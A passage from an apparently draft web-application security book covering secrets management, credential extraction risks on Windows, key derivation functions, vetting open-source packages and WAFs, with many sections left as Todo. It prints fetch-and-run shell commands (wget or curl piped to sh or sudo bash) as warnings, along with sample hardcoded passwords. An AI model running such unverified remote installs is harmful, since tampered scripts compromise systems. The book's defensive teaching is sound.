          // Test password for developer on devbox2
          pass: 'eUoxK=S9<,`@m0T1=^(EZ#61^5H;.H' // App specific password.
       }
    }

{title="stagingbox-staging.js", linenos=off, lang=JavaScript}
    {}

{title="prodbox-production.js", linenos=off, lang=JavaScript}
    {}

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       enquiries: {
          // Password created by the build.
          pass: '10lQu$4YC&x~)}lUF>3pm]Tk>@+{N]' // App specific password.
       }
    }

The [Logging](#web-applications-countermeasures-lack-of-visibility-insufficient-logging) section shows more configuration options to provide a slightly bigger picture.

node-config also:

* Provides command line overrides, thus allowing you to override configuration values at application start from command
* Allows for the overriding of environment variables with [custom environment variables](https://github.com/lorenwest/node-config/wiki/Environment-Variables#custom-environment-variables) from a `custom-environment-variables.json` file

&nbsp;

Encrypting/decrypting credentials in code may provide some obscurity, but not much more than that.  
There are different answers for different platforms. None of which provide complete security, if there is such a thing, but instead focusing on different levels of obscurity.

##### Windows 

**Store database credentials as a Local Security Authority (LSA) secret** and create a DSN with the stored credential. Use a SqlServer [connection string](https://www.owasp.org/index.php/Configuration#Secure_connection_strings) with `Trusted_Connection=yes`

The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut-down. The hashes can be sniffed [from the wire](#network-identify-risks-wire-inspecting) in transit. The hashes can be pulled from the running machines memory (specifically the Local Security Authority Subsystem Service (`LSASS.exe`)) using tools such as Mimikatz, WCE, hashdump or fgdump. An attacker generally only needs the hash. Trusted tools like psexec take care of this for us. All discussed in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation. 

&nbsp;

**Encrypt sections** of a web, executable, machine-level, application-level configuration files with `aspnet_regiis.exe` with the `-pe` option and name of the configuration element to encrypt and the configuration provider you want to use. Either `DataProtectionConfigurationProvider` (uses DPAPI) or `RSAProtectedConfigurationProvider` (uses RSA). the `-pd` switch is used to decrypt or programatically:  
`string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();`

Of course there is a problem with this also. DPAPI uses LSASS, which again an attacker can extract the hash from its memory. If the `RSAProtectedConfigurationProvider` has been used, a key container is required. Mimikatz will force an export from the key container to a `.pvk` file.
Which can then be [read](http://stackoverflow.com/questions/7332722/export-snk-from-non-exportable-key-container) using OpenSSL or tools from the `Mono.Security` assembly.

&nbsp;

I have looked at a few other ways using `PSCredential` and `SecureString`. They all seem to rely on DPAPI which as mentioned uses LSASS which is open for exploitation.

&nbsp;

[**Credential Guard**](https://technet.microsoft.com/en-us/library/mt483740) and Device Guard leverage virtualisation-based security. By the look of it still using LSASS. Bromium have partnered with Microsoft and coined it Micro-virtualization. The idea is that every user task is isolated into its own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what is to stop malicious code doing the same? I have seen lots of questions but no compelling answers yet. Credential Guard must run on physical hardware directly. Can not run on virtual machines. This alone rules out many deployments.

"_Bromium vSentry transforms information and infrastructure protection with a revolutionary new architecture that isolates and defeats advanced threats targeting the endpoint through web, email and documents_"

"_vSentry protects desktops without requiring patches or updates, defeating and
automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

This is marketing talk. Please don't take this literally.

"_vSentry empowers users to access whatever information they need from any network, application or website, without risk to the enterprise_"

"_Traditional security solutions rely on detection and often fail to block targeted attacks which use unknown “zero day” exploits. Bromium uses hardware enforced isolation to stop even “undetectable” attacks without disrupting the user._"

> Bromium

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

> Bromium

These seem like bold claims.

Also worth considering is that Microsofts new virtualization-based security also relies on UEFI Secure Boot, which has been proven [insecure](http://www.itworld.com/article/2707547/endpoint-protection/researchers-demo-exploits-that-bypass-windows-8-secure-boot.html).

##### Linux

**Containers** also help to provide some form of isolation. Allowing you to only have the user accounts to do what is necessary for the application.

I usually use a **deployment tool that also changes the permissions** and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The [deployment script](https://github.com/binarymist/DeploymentTool) is executed over SSH in a remote shell. Only specific commands on the server are allowed to run and a very limited set of users have any sort of access to the machine. If you are using Linux Containers then you can reduce this even more if it is not already.

One of the beauties of GNU/Linux is that you can have as much or little security as you decide. No one has made that decision for you already and locked you out of the source. You are not feed lies like all of the closed source OS vendors trying to pimp their latest money spinning product. GNU/Linux is a dirty little secrete that requires no marketing hype. It just provides complete control if you want it. If you do not know what you want, then someone else will probably take that control from you. It is just a matter of time if it hasn't happened already.

#### Least Privilege {#web-applications-countermeasures-management-of-application-secrets-least-privilege}
![](images/ThreatTags/PreventionEASY.png)

An application should have the least privileges possible in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example where you only need to read from a data store, then create that connection with a users credentials that is only allowed to read, and so on for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege. Also consider removing table access completely from the application and only provide permissions to the application to run stored queries. This way if/when an attacker is able to compromise the machine and retrieve the password for an action on the data-store, they will not be able to do a lot anyway.

#### Location
![](images/ThreatTags/PreventionEASY.png)

Put your services like data-stores on network segments that are as [sheltered](#network-countermeasures-component-placement) as possible and only contain similar services.

Maintain as few user accounts on the servers in question as possible and with the least privileges as possible. 

#### Data-store Compromise {#web-applications-countermeasures-data-store-compromise}
![](images/ThreatTags/PreventionEASY.png)

As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it does not. What assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store from making sense of the sensitive data?

As part of developing the application that uses the data-store, a strategy also needs to be developed and implemented to carry on business as usual when this happens. For example, when your detection mechanisms realise that someone unauthorised has been on the machine(s) that host your data-store, as well as the usual alerts being fired off to the people that are going to investigate and audit, your application should take some automatic measures like:

* All following logins should be instructed to change passwords

If you follow the recommendations below, data-store theft alone will be an inconvenience, but not a disaster.

Consider what sensitive information you really need to store. Consider using the following key derivation functions (KDFs) for all sensitive data. Not just passwords. Also continue to [remind your customers](https://speakerdeck.com/binarymist/passwords-lol) to always use unique passwords that are made up of alphanumeric, upper-case, lower-case and special characters. It is also worth considering pushing the use of high quality password vaults. Do not limit password lengths. Encourage long passwords.

PBKDF2, bcrypt and [scrypt](http://www.tarsnap.com/scrypt.html) are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. "_The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map_ `<credential> -> <protected form>` _must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities._"

> OWASP Password Storage

PBKDF2, bcrypt and the newer scrypt, apply a Pseudorandom Function (PRF) such as a cryptographic hash, cipher or HMAC to the data being received along with a unique salt. The salt should be stored with the hashed data.

Do not use MD5, SHA-1 or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes like hashing your sensitive data. In-fact do not use hashing functions at all for this unless they are leveraged with one of the mentioned KDFs. Why? Because the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their data-stores stolen and continue to on a weekly basis could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
"_Using four AMD Radeon HD6990 graphics cards, I am able to make about 15.5 billion guesses per second using the SHA-1 algorithm._"

> Per Thorsheim

In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt does not have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else.

**Which KDF to use?**

This depends on many considerations. I am not going to tell you which is best, because there is no best. Which to use depends on many things. You are going to have to gain understanding into at least all three KDFs. PBKDF2 is the oldest so it is the most battle tested, but there has also been lessons learnt from it that have been taken to the latter two. The next oldest is bcrypt which uses the Eksblowfish cipher which was designed specifically for bcrypt from the blowfish cipher, to be very slow to initiate thus boosting protection against dictionary attacks which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPUs of the day (1999).  
The hashing functions that PBKDF2 uses were a lot easier to get speed increases due to ease of parallelisation as opposed to the Eksblowfish cipher attributes such as: far greater memory required for each hash, small and frequent pseudo-random memory accesses, making it harder to cache the data into faster memory. Now with hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt brute-forcing is becoming more accessible due to easily obtainable cheap hardware such as:

* [Parallella board](https://www.parallella.org/board/) with Epiphany chip
* [ZedBoard / Zynq 7020](http://picozed.org/product/zedboard)
* [Xeon+FPGA](http://www.extremetech.com/extreme/184828-intel-unveils-new-xeon-chip-with-integrated-fpga-touts-20x-performance-boost)
* [Xeon Phi](http://www.extremetech.com/extreme/133541-intels-64-core-champion-in-depth-on-xeon-phi)
* [Haswell](http://www.theplatform.net/2015/06/02/intel-finishes-haswell-xeon-e5-rollout-launches-broadwell-e3/)

The sensitive data stored within a data-store should be the output of using one of the three key derivation functions we have just discussed. Feed with the data you want protected and a salt. All good frameworks will have at least PBKDF2 and bcrypt APIs

### Lack of Authentication {#web-applications-countermeasures-lack-of-authentication}

_Todo_  
_Todo_   
...

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-countermeasures-cryptography-on-the-client}

_Todo_

### Consuming Free and Open Source {#web-applications-countermeasures-consuming-free-and-open-source}
![](images/ThreatTags/PreventionEASY.png)

#### Process

Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I will attempt to paraphrase some of them here:

* Implement process and governance around which open source libraries you can use
* Legal review: checking licenses
* Scanning the code for vulnerabilities, manual and automated code review
* Maintain a list containing all the libraries that have been approved for use.  
If not on the list, make request and it should go through the same process.
* Once the libraries are in your product they should become as part of your own code so that they get the same rigour over them as any of your other code written in-house
* There needs to be automated process that runs over the code base to check that nothing that is not on the approved list is included
* Consider automating some of the suggested tooling options below

There is an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
for Enterprise Requirements](http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305) that is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries.

#### Consumption is Your Responsibility

As a developer, you are responsible for what you install and consume. [Malicious NodeJS packages](https://github.com/joaojeronimo/rimrafall) do end up on NPM from time to time. The same goes for any source or binary you download and run. The following commands are often encountered as being "the way" to install things:

{title="wget", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(wget https://raw.github.com/account/repo/install.sh -O -)"

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(curl -fsSL https://raw.github.com/account/repo/install.sh)"

Below is the [official way](https://github.com/nodesource/distributions) to install NodeJS. Do not do this. `wget` or `curl` first, then make sure what you have just downloaded is not malicious.

A>
A> Inspect the code before you run it.
A>

1. The repository could have been tampered with
2. The transmission from the repository to you could have been intercepted and modified.

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
    sudo apt-get install -y nodejs

#### Keeping Safe

##### wget, curl, etc:

Please do not `wget`, `curl` or fetch in any way and pipe what you think is an installer or any script to your shell without first verifying that what you are about to run is not malicious. Do not download and run in the same command.

The better option is to:

1. Verify the source that you are about to download, if all good
2. Download it
3. Check it again, if all good
4. Only then should you run it

##### npm install:

As part of an `npm install`, package creators, maintainers (or even a malicious entity intercepting and modifying your request on the [wire](#network-identify-risks-wire-inspecting)) can define scripts to be run on specific [NPM hooks](https://docs.npmjs.com/misc/scripts). You can check to see if any package has hooks (before installation) that will run scripts by issuing the following command:  
`npm show [module-you-want-to-install] scripts`

Recommended procedure:

1. Verify the source that you are about to download, if all good
2. `npm show [module-you-want-to-install] scripts`
3. Download the module without installing it and inspect it. You can download it from `http://registry.npmjs.org/[module-you-want-to-install]/-/[module-you-want-to-install]-VERSION.tgz`

The most important step here is downloading and inspecting before you run.

##### Doppelganger Packages:

Similarly to [Doppelganger Domains](#network-identify-risks-doppelganger-domains), People often miss-type what they want to install. If you were someone that wanted to do something malicious like have consumers of your package destroy or modify their systems, send sensitive information to you, or any number of other criminal activities (ideally identified in the [Identify Risks](#web-applications-identify-risks-consuming-free-and-open-source) section. If not already, add), doppelganger packages are an excellent avenue for raising the likelihood that someone will install your malicious package by miss typing the name of it with the name of another package that has a very similar name. I covered this in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation, with demos.

Make sure you are typing the correct package name. Copy -> Pasting works.

#### Tooling {#web-applications-countermeasures-consuming-free-and-open-source-tooling}

For **NodeJS developers**: Keep your eye on the [nodesecurity advisories](https://nodesecurity.io/advisories). Identified security issues can be posted to [NodeSecurity report](https://nodesecurity.io/report).

##### [RetireJS](https://github.com/RetireJS/retire.js)

Is useful to help you find JavaScript libraries with known vulnerabilities.  
RetireJS has the following:

1. Command line scanner
    * Excellent for CI builds. Include it in one of your build definitions and let it do the work for you.
      * To install globally:  
      `npm i -g retire`
      * To run it over your project:  
      `retire my-project`  
      Results like the following may be generated:

        {linenos=off}
            public/plugins/jquery/jquery-1.4.4.min.js
            ↳ jquery 1.4.4.min has known vulnerabilities:
            http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969
            http://research.insecurelabs.org/jquery/test/
            http://bugs.jquery.com/ticket/11290

    * To install RetireJS locally to your project and run as a git `precommit-hook`.  
    There is an NPM package that can help us with this, called `precommit-hook`, which installs the git `pre-commit` hook into the usual `.git/hooks/pre-commit` file of your projects repository. This will allow us to run any scripts immediately before a commit is issued.  
    Install both packages locally and save to `devDependencies` of your `package.json`. This will make sure that when other team members fetch your code, the same `retire` script will be run on their `pre-commit` action.
    
      {linenos=off}
          npm install precommit-hook --save-dev
          npm install retire --save-dev
        
      If you do not configure the hook via the `package.json` to run specific scripts, it will run `lint`, `validate` and `test` by default. See the RetireJS documentation for options.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             }
          }
        
      Adding the `pre-commit` property allows you to specify which scripts you want run before a successful commit is performed. The following `package.json` defines that the `lint` and `validate` scripts will be run. `validate` runs our `retire` command.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             },
             "pre-commit": ["lint", "validate"]
          }
        
      Keep in mind that `pre-commit` hooks can be very useful for all sorts of checking of things immediately before your code is committed. For example running security tests mentioned previously with the [OWASP ZAP API](#web-applications-development-practices-security-test-driven-development).
2. Chrome extension
3. Firefox extension
4. Grunt plugin
5. Gulp task
6. Burp and OWASP ZAP plugin
7. [On-line tool](http://retire.insecurity.today/) you can simply enter your web applications URL and the resource will be analysed

##### requireSafe

provides "_intentful auditing as a stream of intel for bithound_". I guess watch this space, as in speaking with [Adam Baldwin](https://twitter.com/adam_baldwin), there doesn't appear to be much happening here yet.

##### bithound:

In regards to NPM packages, we know the following things:

1. We know about a small collection of vulnerable NPM packages. Some of which have high fan-in (many packages depend on them).
2. The vulnerable packages have published patched versions
3. Many packages are still consuming the vulnerable unpatched versions of the packages that have published patched versions
  * So although we could have removed a much larger number of vulnerable packages due to their persistence on depending on unpatched packages, we have not. I think this mostly comes down to lack of visibility, awareness and education. This is exactly what I'm trying to change.

bithound supports:

* JavaScript, TypeScript and JSX (back-end and front-end)
* In terms of version control systems, only git is supported
* Opening of bitbucket and github issues
* Providing statistics on code quality, maintainability and stability. I queried Adam on this, but not a lot of information was forth coming.

bithound can be configured to not analyse some files. Very large repositories are prevented from being analysed due to large scale performance issues.

Analyses both NPM and Bower dependencies and notifies you if any are:

* Out of date
* Insecure. Assuming this is based on the known vulnerabilities (41 node advisories at the time of writing this)
* Unused

Analysis of opensource projects are free.

You could of course just list all of your projects and global packages and check that there are none in the [advisories](https://nodesecurity.io/advisories), but this would be more work and who is going to remember to do that all the time?

&nbsp;

For **.Net developers**, there is the likes of [OWASP **SafeNuGet**](https://github.com/OWASP/SafeNuGet).

### Lack of Active Automated Prevention

#### Web Application Firewall (WAF) {#web-applications-countermeasures-lack-of-active-automated-prevention-waf}

[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). So they understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, like XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that do not exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through its interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they have not seen before like responses containing larger than specified payloads. Source code of the web application does not have to be modified.

1. [Fusker](https://www.npmjs.com/package/fusker). Not sure if this is still actively maintained. At this point, there has not been any recent commits for about three years, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out...
2. [express-waf](https://www.npmjs.com/package/express-waf) has recent commits, but there is only a single developer working on it when I checked.

#### Application Intrusion Detection and Response

You can think of this as taking a WAF one level closer to your application. That is right, augmenting your application with logic to detect and respond to threats

AppSensor [AppSensor](http://appsensor.org/) brings detection -> prevention to your domain level.
  Most applications today just take attacks & fall over.
  I have heard so many times we want our applications to fail securely when they get bad input.
  We do not want our applications being bullied and failing securely.
  We want them to not fail at all in production, but rather defend themselves.
 
  Technically AppSensor is not a WAF because the concepts are used to shape your application logic.

  The project defines a conceptual framework and methodology that offers prescriptive guidance to implement intrusion detection and automated response into your applications. Providing attack awareness baked in, with real-time defences.
  
  AppSensor provides > 50 (signature based) detection points. Provides guidance on how to respond once attack identified. Possible actions include:
    
  * logging out the user
  * locking the account or notifying an administrator
  * more than a dozen response actions are described.

_Todo_

%% http://www.slideshare.net/jtmelton/appsensor-near-real-time-event-detection-and-response

## 4. SSM Risks that Solution Causes

### Lack of Visibility

With the added visibility, you will have to make decisions based on the new found information you now have. There will be no more blissful ignorance if there was before.

#### Insufficient Logging and Monitoring

There will be learning and work to be done to become familiar with libraries and tooling. Code will have to be written around logging as in wrapping libraries, initialising and adding logging statements or hiding them using AOP.

Instrumentation will have to be placed in your code. Again another excellent candidate for AOP.

### Lack of Input Validation, Filtering and Sanitisation

_Todo_

#### Buffer Overflows

_Todo_

#### Cross-Site Scripting (XSS)

_Todo_

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi

_Todo_

#### Command Injection

_Todo_

#### LDAP Injection

_Todo_

#### XPath Injection

_Todo_

#### XQuery Injection

_Todo_

#### XSLT Injection

_Todo_

#### XML Injection

_Todo_

### Management of Application Secrets

Reliance on adjacent layers of defence means those layers have to actually be up to scratch. There is a possibility that they will not be.

Possibility of missing secrets being sent over the wire.

Possible reliance on obscurity with many of the strategies I have seen proposed. Just be aware that obscurity may slow an attacker down a little, but it will not stop them.

#### Store Configuration in Configuration files

With moving any secrets from source code to configuration files, there is a possibility that the secrets will not be changed at the same time. If they are not changed, then you have not really helped much, as the secrets are still in source control.

With good configuration tools like node-config, you are provided with plenty of options of splitting up meta-data, creating overrides, storing different parts in different places, etc. There is a risk that you do not use the potential power and flexibility to your best advantage. Learn the ins and outs of what ever system it is you are using and leverage its features to do the best at obscuring your secrets and if possible securing them.

##### node-config

is an excellent configuration package with lots of great features. There is no security provided with node-config, just some potential obscurity. Just be aware of that, and as discussed previously, make sure surrounding layers have beefed up security.

##### Windows:

As is often the case with Microsoft solutions, their marketing often leads people to believe that they have secure solutions to problems when that is not the case. As discussed previously, there are plenty of ways to get around the Microsoft so called security features. As anything else in this space, they may provide some obscurity, but do not depend on them being secure.

Statements like the following have the potential for producing over confidence:

"_vSentry protects desktops without requiring patches or updates, defeating and automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

Please keep your systems patched and updated.

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

There is a risk that people will believe this.

##### Linux:

As with Microsofts "virtualisation-based security" Linux containers may slow system compromise down, but a determined attacker will find other ways to get around container isolation. Maintaining a small set of user accounts is a worthwhile practise, but that alone will not be enough to stop a highly skilled and determined attacker moving forward.  
Even when technical security is very good, an experienced attacker will use other mediums to gain what they want, like [social engineering](#people-identify-risks), [physical](#physical-identify-risks) compromise, both, or some other attack vectors listed in this book. Defence in depth is crucial in achieving good security. Concentrating on the lowest hanging fruit first and working your way up the tree.

Locking file permissions and ownership down is good, but that alone will not save you. 

#### Least Privilege

Applying least privilege to everything can take quite a bit of work. Yes, it is probably not that hard to do, but does require a breadth of thought and time. Some of the areas discussed could be missed. Having more than one person working on the task is often effective as each person can bounce ideas off of each other and the other person is likely to notice areas that you may have missed and visa-versa.

#### Location

Segmentation is useful, and a common technique to helping to build resistance against attacks. It does introduce some complexity though. With complexity comes the added likely-hood of introducing a fault. 

#### Data-store Compromise

If you follow the advice in the [countermeasures](#web-applications-countermeasures-data-store-compromise) section, you will be doing more than most other organisations in this area. It is not hard, but if implemented could increase complacency/over confidence. Always be on your guard. Always expect that although you have done a lot to increase your security stance, a determined and experienced attacker is going to push buttons you may have never realised you had. If they want something enough and have the resources and determination to get it, they probably will. This is where you need strategies in place to deal with post compromise. Create process (ideally partly automated) to deal with theft.

Also consider that once an attacker has made off with your data-store, even if it is currently infeasible to brute-force the secrets, there may be other ways around obtaining the missing pieces of information they need. Think about the [paper shredders](#physical-identify-risks-sensitive-printed-matter) and the associated [competitions](http://archive.darpa.mil/shredderchallenge/). With patience, most puzzles can be cracked. If the compromise is an opportunistic type of attack, they will most likely just give up and seek an easier target. If it is a targeted attack by determined and experienced attackers, they will probably try other attack vectors until they get what they want.

Do not let over confidence be your weakness. An attacker will search out the weak link. Do your best to remove weak links.

### Lack of Authentication

_Todo_

### Cryptography on the Client (AKA Untrusted Crypto)

_Todo_

### Consuming Free and Open Source

Some of the packages we consume may have good test coverage, but are the tests testing the right things? Are the tests testing that something can not happen? That is where the likes of RetireJS comes in.

#### Process

There is a danger of implementing to much manual process thus slowing development down more than necessary. The way the process is implemented will have a lot to do with its level of success. For example automating as much as possible, so developers don't have to think about as much as possible is going to make for more productive, focused and [happier](https://en.wikipedia.org/wiki/Kaizen) developers.

For example, when a Development Team needs to pull a library into their project, which often happens in the middle of working on a product backlog item (not planned at the beginning of the Sprint), if they have to context switch while a legal review and/or manual code review takes place, then this will cause friction and reduce the teams performance even though it may be out of their hands.  
In this case, the Development Team really needs a dedicated resource to perform the legal review. The manual review could be done by another team member or even themselves with perhaps another team member having a quicker review after the fact. These sorts of decisions need to be made by the Development Team, not mandated by someone outside of the team that doesn't have skin in the game or does not have the localised understanding that the people working on the project do.

Maintaining a list of the approved libraries really needs to be a process that does not take a lot of human interaction. How ever you work out your process, make sure it does not require a lot of extra developer effort on an ongoing basis. Some effort up front to automate as much as possible will facilitate this.

#### Tooling

Using the likes of pre-commit hooks, the other tooling options detailed in the [Countermeasures](#web-applications-countermeasures-consuming-free-and-open-source) section and creating scripts to do most of the work for us is probably going to be a good option to start with.

### Lack of Active Automated Prevention

#### Web Application Firewall (WAF)

_Todo_

#### Application Intrusion Detection and Response

_Todo_

## 5. SSM Costs and Trade-offs

### Lack of Visibility

#### Insufficient Logging and Monitoring

You can do a lot for little cost here. I would rather trade off a few days work in order to have really good logging and instrumentation systems through your code base that is going to show you errors fast in development and pretty much anything you want to measure. Then show the types of errors and statistics devops need to see in production.

Same goes for dark cockpit type monitoring. Find a tool that you find working with a pleasure. There are just about always free and open source tools to every commercial alternative. If you are working with a start-up or young business, the free and open source tools can be excellent to keep ongoing costs down. Especially mature tools that are also well maintained like the ones I've mentioned in the [Countermeasures](#web-applications-countermeasures-lack-of-visibility) section.

### Lack of Input Validation, Filtering and Sanitisation

_Todo_

#### Buffer Overflows

_Todo_

#### Cross-Site Scripting (XSS)

_Todo_

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi

_Todo_

#### Command Injection

_Todo_

#### LDAP Injection

_Todo_

#### XPath Injection

_Todo_

#### XQuery Injection

_Todo_

#### XSLT Injection

_Todo_

#### XML Injection

_Todo_

### Management of Application Secrets

There is potential for hidden costs here, as adjacent layers will need to be hardened. There could be trade-offs here that force us to focus on the adjacent layers. This is never a bad thing though. It helps us to step back and take a holistic view of our security.

#### Store Configuration in Configuration files

There should be little cost in moving secrets out of source code and into configuration files.

##### Windows:

You will need to weigh up whether the effort to obfuscate secrets is worth it or not. It can also make the developers job more cumbersome. Some of the options provided may be worthwhile doing.

##### Linux

Containers have many other advantages and you may already be using them for making your deployment processes easier and less likely to have dependency issues. They also help with scaling and load balancing, so they have multiple benefits.

#### Least Privilege

Is something you should be at least considering and probably doing in every case. It is one of those considerations that is worth while applying to most layers.

#### Location

Segmenting of resources is a common and effective measure to take for at least slowing down attacks and a cost well worth considering if you have not already.

#### Data-store Compromise

The countermeasures discussed here go without saying, although many organisations do not do them well if at all. It is up to you whether you want to be one of the statistics that has all of their secrets revealed. Following the countermeasures here is something that just needs to be done if you have any data that is sensitive in your data-store(s). 

### Lack of Authentication

_Todo_

### Cryptography on the Client (AKA Untrusted Crypto)

_Todo_

### Consuming Free and Open Source

The process has to be streamlined so that it does not get in the developers way. A good way to do this is to ask the developers how it should be done. They know what will get in their way. In order for the process to be a success, the person(s) mandating it will need to get solid buy-in from the people using it (the developers).

The idea of setting up a process that notifies at least the Development Team if a library they want to use has known security defects, needs to be pitched to all stakeholders (developers, product owner, even external stakeholders) the right way. It needs to provide obvious benefit and not make anyones life harder than it already is. Everyone has their own agendas. Rather than fighting against them, include consideration for them in your pitch. I think this sort of a pitch is actually reasonably easy if you keep these factors in mind.

### Lack of Active Automated Prevention

#### Web Application Firewall (WAF)

_Todo_

#### Application Intrusion Detection and Response

_Todo_